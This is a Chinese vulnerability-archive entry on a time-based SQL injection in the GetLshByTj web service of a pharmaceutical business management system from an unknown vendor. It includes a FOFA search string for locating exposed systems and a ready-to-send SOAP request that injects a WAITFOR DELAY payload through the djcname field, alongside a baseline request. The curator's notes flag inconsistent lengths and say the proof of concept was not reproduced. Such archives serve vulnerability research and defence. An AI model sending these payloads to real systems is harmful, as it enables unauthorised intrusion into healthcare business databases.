---
source: "wy876 漏洞文库"
title: "医药业务管理系统（厂商未知） WebService GetLshByTj djcname SQL注入"
product: "医药业务管理系统（厂商未知）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "SQL Server，产品/版本未明"
prerequisites: "样例带_sid Cookie，是否认证不清"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ffth09eureon16c6"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%8C%BB%E7%96%97%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F/%E5%8C%BB%E8%8D%AF%E5%85%AC%E5%8F%B8%E7%99%BB%E5%BD%95%E7%B3%BB%E7%BB%9FGetLshByTj%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"ResourceScripts/zh-cn-Login.aspx.js\""
fofa_unverified: "body="
id: "vw-719fa3d8ef643f8672008525"
entity_id: "ve-719fa3d8ef643f8672008525"
schema_version: "1"
---

# 医药业务管理系统（厂商未知） WebService GetLshByTj djcname SQL注入

## 条目说明

- 对象与具体问题：医药业务管理系统（厂商未知）；WebService GetLshByTj djcname SQL注入
- 版本、配置及部署条件：SQL Server，产品/版本未明
- 认证与权限前提：样例带_sid Cookie，是否认证不清
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 注入请求更长却Content-Length454、基准短却478，明显未同步请求长度
- tjstr/djcname为工具占位拉丁文，需要说明真实业务参数前提；redonly拼写按接口保留
- 5秒与基准虽都有无返回时间，不能据请求确认成功
- 目录医疗信息系统、标题医药公司过泛，需发行方和产品识别避免误归整个行业

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
医药公司登录系统是一个全面且高效的管理工具，涵盖了销售管理、客户档案管理、药品字典管理等多个核心模块。该系统支持前台零售、批发销售、销售审核等多种销售方式，并具备完善的客户档案管理功能，包括客户的基本信息、经营权限等。此外，系统还提供国药标准药品字典库云下载功能，便于用户快速获取药品信息。整体而言，医药公司登录系统通过自动化的管理和数据分析，帮助医药企业优化业务流程，提升市场竞争力。

## 二、影响版本
+ 医药公司登录系统

## 三、资产测绘
+ fofa`body="ResourceScripts/zh-cn-Login.aspx.js"`


## 四、漏洞复现
```http
POST /WebService.asmx HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: _sid=t****************************2
Upgrade-Insecure-Requests: 1
Priority: u=1
SOAPAction: http://tempuri.org/GetLshByTj
Content-Type: text/xml;charset=UTF-8
Host: 

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:GetLshByTj>
         <!--type: string-->
         <tem:tjstr>gero et</tem:tjstr>
         <!--type: string-->
         <tem:djcname>onoras imperio';WAITFOR DELAY '0:0:5'--</tem:djcname>
         <!--type: boolean-->
         <tem:redonly>true</tem:redonly>
      </tem:GetLshByTj>
   </soapenv:Body>
</soapenv:Envelope>
```

> 请求长度说明：原资料 Content-Length 为 454；静态长度已移除，应由客户端根据最终请求体的字节数生成。


```http
POST /WebService.asmx HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: _sid=t****************************2
Upgrade-Insecure-Requests: 1
Priority: u=1
SOAPAction: http://tempuri.org/GetLshByTj
Content-Type: text/xml;charset=UTF-8
Host: 

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
   <soapenv:Header/>
   <soapenv:Body>
      <tem:GetLshByTj>
         <!--type: string-->
         <tem:tjstr>gero et</tem:tjstr>
         <!--type: string-->
         <tem:djcname>onoras imperio</tem:djcname>
         <!--type: boolean-->
         <tem:redonly>true</tem:redonly>
      </tem:GetLshByTj>
   </soapenv:Body>
</soapenv:Envelope>
```

> 请求长度说明：原资料 Content-Length 为 478；静态长度已移除，应由客户端根据最终请求体的字节数生成。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ffth09eureon16c6>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
